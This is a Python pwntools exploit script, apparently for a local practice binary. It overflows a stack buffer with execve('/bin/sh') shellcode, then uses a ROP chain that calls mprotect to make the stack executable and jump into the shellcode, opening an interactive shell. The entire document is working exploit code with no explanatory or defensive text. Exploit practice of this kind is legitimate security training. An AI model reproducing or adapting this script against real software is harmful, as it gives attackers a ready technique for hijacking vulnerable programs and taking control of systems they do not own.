from pwn import *

assert(args.ADDR)

binfile = './a.out'
context.binary = elf = ELF(binfile)
libc = elf.libc
libc.address = 0x7ffff7dc9000

offset = 120
stack_addr = 0x7ffffffde000 
stack_size = 0x21000  
buf_addr = int(args.ADDR, 16)


shellcode = asm('''
     .intel_syntax noprefix
    .global _start
_start:
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f6e69622f
    push rax 
    mov rdi, rsp
    push rdx
    push rdi 
    mov rsi, rsp 
    lea rax, [rdx + 59]
    syscall
''', arch = 'amd64')

gs = '''
b main
c
'''

rop = ROP([elf, libc])
rop.raw(pack(rop.rdi.address))
rop.raw(pack(stack_addr))
rop.raw(pack(rop.rsi.address))
rop.raw(pack(stack_size))
rop.raw(pack(rop.rdx.address))
rop.raw(0x7)
rop.raw(pack(libc.sym['mprotect']))
rop.raw(pack(buf_addr))

payload = shellcode 
payload += b'a' * (offset - len(shellcode))
payload += rop.chain()

def start():
    if args.GDB:
        return gdb.debug(binfile, gdbscript = gs)
    else:
        return process(binfile)

io = start()
print(io.recvline())
io.sendline(payload)
io.clean()
io.interactive()


